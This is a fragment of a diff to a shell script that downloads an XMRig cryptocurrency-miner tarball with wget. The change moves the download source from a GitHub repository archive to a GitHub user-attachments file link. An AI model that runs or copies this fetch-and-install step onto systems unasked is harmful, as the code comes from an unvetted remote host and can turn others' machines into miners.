@@ -34,7 +34,7 @@ mkdir -p "$WORKDIR"
 echo "[2] Downloading XMRIG package..."
 
 wget -q \
-  https://github.com/xuemiaolan/web3/archive/refs/tags/xmrig-6.24.0.tar.gz \
+ https://github.com/user-attachments/files/23701380/xmrig-6.24.0.tar.gz \
   -O "$WORKDIR/xmrig.tar.gz"
 
 echo "[Extracting...]"
